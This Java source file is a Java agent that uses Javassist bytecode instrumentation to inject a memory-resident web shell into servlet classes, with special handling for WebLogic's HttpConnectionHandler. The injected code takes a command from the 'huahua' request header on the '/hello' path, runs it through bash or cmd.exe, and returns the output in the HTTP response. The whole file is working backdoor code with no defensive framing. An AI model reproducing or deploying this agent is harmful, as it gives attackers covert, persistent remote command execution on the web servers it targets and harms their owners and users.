import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.FileOutputStream;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.util.*;

public class c {
    public static void agentmain(String agentArgs, Instrumentation inst){
        Class[] cLasses = inst.getAllLoadedClasses();
        byte[] data = new byte[0];
        Map targetClasses = new HashMap();
        Map targetClassJavaxMap = new HashMap();
        targetClassJavaxMap.put("methodName", "service");
        List paramJavaxClsStrList = new ArrayList();
        paramJavaxClsStrList.add("javax.servlet.ServletRequest");
        paramJavaxClsStrList.add("javax.servlet.ServletResponse");
        targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        Map targetClassJakartaMap = new HashMap();
        targetClassJakartaMap.put("methodName", "service");
        List paramJakartaClsStrList = new ArrayList();
        paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
        paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
        targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
        String getCoreObject = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\n";
        ClassPool cPool = ClassPool.getDefault();
        if (ServerDetector.isWebLogic()) {
            System.out.println("this server is weblogic");
            targetClasses.clear();
            Map targetClassWeblogicMap = new HashMap();
            //targetClassWeblogicMap.put("methodName", "execute");
            targetClassWeblogicMap.put("methodName", "resolveServletContext");
            List paramWeblogicClsStrList = new ArrayList();
//            paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
//            paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
//            targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
//            targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
            paramWeblogicClsStrList.add(String.class.getName());
            targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
            targetClasses.put("weblogic.servlet.internal.HttpConnectionHandler", targetClassWeblogicMap);
        }
        String shellCode="javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) this.request;\n" +
                "        String pathPattern = \"%s\";\n" +
                "        System.out.println(request.getRequestURI());\n" +
                "        this.initInputStream();String outs=request.getReader().readLine();        java.lang.reflect.Field parametersFeild=weblogic.servlet.internal.ServletRequestImpl.class.getDeclaredField(\"parameters\");\n" +
                "        parametersFeild.setAccessible(true);\n" +
                "        weblogic.servlet.internal.ServletRequestImpl.RequestParameters requestParameters=(weblogic.servlet.internal.ServletRequestImpl.RequestParameters)parametersFeild.get(request);\n" +
                "        java.lang.reflect.Field queryStringBufferField=weblogic.servlet.internal.ServletRequestImpl.RequestParameters.class.getDeclaredField(\"queryStringBuffer\");\n" +
                "        queryStringBufferField.setAccessible(true);\n" +
                "        if (request.getRequestURI().equals(pathPattern)) {\n" +
                "            System.out.println(\"进入url匹配后得内容\");\n" +
                "            this.response.getServletOutputStream().setWriteEnabled(!this.request.getInputHelper().getRequestParser().isMethodHead());\n" +
                "            this.response.setStatus(200);\n" +
                "            final javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) this.response;\n" +
                "            String cmd=request.getHeader(\"huahua\");\n" +
                "            boolean isLinux = true;\n" +
                "            String content;\n" +
                "            String osTyp = System.getProperty(\"os.name\");\n" +
                "            if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
                "                isLinux = false;\n" +
                "            }\n" +
                "\n" +
                "            java.util.List cmds;\n" +
                "            cmds=new java.util.ArrayList();\n" +
                "\n" +
                "            if (cmd.startsWith(\"$NO$\")) {\n" +
                "                cmds.add(cmd.substring(4));\n" +
                "            }else if (isLinux) {\n" +
                "                cmds.add(\"/bin/bash\");\n" +
                "                cmds.add(\"-c\");\n" +
                "                cmds.add(cmd);\n" +
                "            } else {\n" +
                "                cmds.add(\"cmd.exe\");\n" +
                "                cmds.add(\"/c\");\n" +
                "                cmds.add(cmd);\n" +
                "            }\n" +
                "\n" +
                "            ProcessBuilder processBuilder = new ProcessBuilder(cmds);\n" +
                "            processBuilder.redirectErrorStream(true);\n" +
                "            Process proc = processBuilder.start();\n" +
                "\n" +
                "            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));\n" +
                "            StringBuffer sb = new StringBuffer();\n" +
                "\n" +
                "            String line;\n" +
                "            while ((line = br.readLine()) != null) {\n" +
                "                sb.append(line).append(\"\\n\");\n" +
                "            }\n" +
                "\n" +
                "            content=sb.toString();"+
                "\n" +
                "Object so;"+
                "so=this.response.getClass().getMethod(\"getOutputStream\",null).invoke(this.response,null);\n" +
                "System.out.println(so);"+
                "so.getClass().getMethod(\"write\", new Class[]{byte[].class}).invoke(so,new Object[]{content.getBytes(\"UTF-8\")});"+
                "so.getClass().getMethod(\"flush\",null).invoke(so,null);"+
                "so.getClass().getMethod(\"commit\",null).invoke(so,null);"+
                "            this.httpSocket.closeConnection((java.lang.Throwable)null);                return;\n" +
                "            }";
        //        String shellCode="System.out.println(\"------------------haha--%s--%s-----------------\");";
        Class[] var28 = cLasses;
        int var13 = cLasses.length;
        for(int var14 = 0; var14 < var13; ++var14) {
            Class cls = var28[var14];
            if (targetClasses.keySet().contains(cls.getName())) {
                System.out.println("*********************已经找到要修改得类:"+cls.getName()+"***********************");
                String targetClassName = cls.getName();

                try {

                    String path="/hello";
                    shellCode = String.format(shellCode, path);
                    if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
                        shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
                    }

                    ClassClassPath classPath = new ClassClassPath(cls);
                    cPool.insertClassPath(classPath);
                    cPool.importPackage("java.lang.reflect.Method");
                    cPool.importPackage("javax.crypto.Cipher");
                    List paramClsList = new ArrayList();
                    Iterator var21 = ((List)((Map)targetClasses.get(targetClassName)).get("paramList")).iterator();

                    String methodName;
                    while(var21.hasNext()) {
                        methodName = (String)var21.next();
                        paramClsList.add(cPool.get(methodName));
                    }

                    CtClass cClass = cPool.get(targetClassName);
                    methodName = ((Map)targetClasses.get(targetClassName)).get("methodName").toString();
                    CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[])paramClsList.toArray(new CtClass[paramClsList.size()]));
                    cMethod.insertBefore(shellCode);
                    cClass.detach();
                    data = cClass.toBytecode();
                    FileOutputStream fileOutputStream=new FileOutputStream("fuckweblogic.class");
                    fileOutputStream.write(data);
                    fileOutputStream.close();
                    inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(cls, data)});
                } catch (Exception var24) {
                    var24.printStackTrace();
                } catch (Error var25) {
                    var25.printStackTrace();
                }
            }
        }

    }
    private static byte[] base64decode(String base64Text) throws Exception {
        String version = System.getProperty("java.version");
        byte[] result;
        Class Base64;
        Object Decoder;
        if (version.compareTo("1.9") >= 0) {
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
        } else {
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
        }

        return result;
    }

    private static String base64encode(String content) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        Class Base64;
        Object Encoder;
        if (version.compareTo("1.9") >= 0) {
            Base64 = Class.forName("java.util.Base64");
            Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("uTF-8"));
        } else {
            Base64 = Class.forName("sun.misc.BASE64Encoder");
            Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content.getBytes("uTF-8"));
            result = result.replace("\n", "").replace("\r", "");
        }

        return result;
    }

}
